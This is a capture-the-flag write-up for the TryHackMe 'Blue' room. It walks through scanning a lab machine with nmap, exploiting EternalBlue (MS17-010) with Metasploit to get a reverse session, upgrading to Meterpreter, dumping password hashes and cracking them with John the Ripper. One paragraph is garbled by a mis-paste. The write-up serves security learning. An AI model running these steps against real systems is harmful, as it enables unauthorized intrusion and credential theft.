A guided write to the "Blue" room on THM
TryHackMe Room: https://tryhackme.com/room/blue

# Background on Eternal Blue
Server Message Block (SMB) is a network protocol used by Windows systems to share files, printers, and other resources over a network. It allows a client to request access to files or services on a server, and the server responds with the requested data or action. SMB operates over TCP ports 139 and 445, with modern systems using port 445 by default.

The protocol manages authentication, communication, and data transfer between systems. It supports operations like reading and writing files, creating directories, and controlling printers. SMB also handles inter-process communication through named pipes, which lets applications on different machines communicate.

SMBv1, the earliest version, is outdated and has weak security controls. It trusts input too easily and does not handle malformed requests safely. These weaknesses led to critical exploits like EternalBlue. Later versions, SMBv2 and SMBv3, improved efficiency and added stronger security measures, including encryption and better authentication methods.

EternalBlue specifically abuses the way SMBv1 processes specially crafted packets. By sending malicious requests, an attacker triggers a buffer overflow that allows them to execute arbitrary code on the target system with high privileges. This makes SMB both essential in Windows environments and a high-value target when unpatched.

# task 1 (recon) 
Objective: Identify open ports, services, and potential vulnerabilities on the target machine.

Command Used:
```bash
nmap --script="vuln" -sV -sC -A -T5 10.10.56.99
```

Explanation of Flags:
--script="vuln": Runs vulnerability scripts to check for known weaknesses.

-sV: Detects service versions.

-sC: Runs default scripts for additional info.

-A: Enables OS detection, version detection, script scanning, and traceroute.

-T5: Increases scan speed.

Scan Results Summary:
![alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20114952%20-%20Copy.png)

Observations:
* SMB ports (139/445) are open, making it a primary target.

* RDP (3389) is tcpwrapped — needs credentials.

* RPC ports (135 + high range) are open but not directly exploitable without authentication.
Key takeaway:
MS17-010 is the exploitable vector. This allows remote code execution via SMBv1 without authentication in many cases.

# Task 2 Gain Access
Task 2 – Gaining Access (THM Writeup)
Objective

The goal of this task was to gain access to the target Windows machine by exploiting a known vulnerability in the SMBv1 service, specifically MS17-010, also known as EternalBlue.

Steps Taken

Starting the Exploitation
The first step involved opening the Metasploit Framework, a commonly used exploitation tool. This allowed access to a large set of pre-built exploits and payloads specifically designed for known vulnerabilities like MS17-010.

Finding the Correct Exploit
Within the framework, a search was conducted to locate the exploit module that targets MS17-010. The module designed for Windows SMBv1 was selected as it matched the target system’s open SMB port and version.

Reviewing Module Requirements
Before running the exploit, the module options were reviewed. This included confirming the target IP, the port on which SMB was running, and the payload to use for gaining a session. It is important to verify these details to ensure the exploit runs successfully.

Setting Up the Exploit
The exploit module was configured with the target machine’s IP and a payload that would create a remote session back to the attacking machine. This step ensures that, when the exploit succeeds, access is granted in a controlled and predictable way.

Launching the Exploit
The exploit was executed against the target machine. Due to the vulnerability in SMBv1, the exploit successfully triggered remote code execution, providing a session on the system.

the following lines of code was used minus the output are
```bash
msfconsole
search ms17-010
use 0
show options
set RHOST 10.10.56.99
Set LHOST 10.8.196.205
exploit
```
![alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20121655.png)
# Task 3 (Privlage Escalation)
By using one of the post exploitation modules, we will upgrade our shell to meterpreter shell

```bash
search shell_to_meterpreter
```

we can see list of modules, there we find only one module, shown below

post/multi/manage/shell_to_meterpreter
![alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20123638.png)
![alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20123703.png)
As giHere we need to set the “SESSION” also the LHOST

After setting all these, we will Exploit to get the meterpreter shellven below to interact with the module we will be using “use 0” and then show options, what options we will be required to change ?
![alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20140530.png)
# task 4 cracking
As said to run the command “hashdump” these command had dumped three user names along with the encrypted passwords, we need to crack the encrypted password and find out the answer.
![alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20140530.png)
 I cracked the password with the help from john the ripper 
![alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202024-02-22%20181804.png)
 # task 5 (flag)
 we have have full access to the computer we can access the flags
